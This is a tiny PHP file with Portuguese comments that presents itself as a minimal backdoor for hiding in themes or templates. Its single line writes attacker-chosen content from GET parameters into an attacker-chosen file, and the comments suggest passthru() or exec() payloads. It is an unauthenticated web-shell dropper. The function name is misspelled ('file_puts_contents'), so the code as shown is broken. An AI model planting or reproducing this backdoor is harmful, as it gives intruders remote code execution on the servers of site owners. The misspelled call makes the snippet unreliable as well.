<?php

# Esquema Mínimo de PHP para Backdoor (cuidado com os códigos fontes de temas e templates)

// Sem padrões do PHP, apenas uma linha (file:exemplo.php, keys: passthru(...) ou exec(...) [system não funcionou]):

if (isset($_GET['file'],$_GET['keys'])) { file_puts_contents($_GET['file'],$_GET['keys']); }
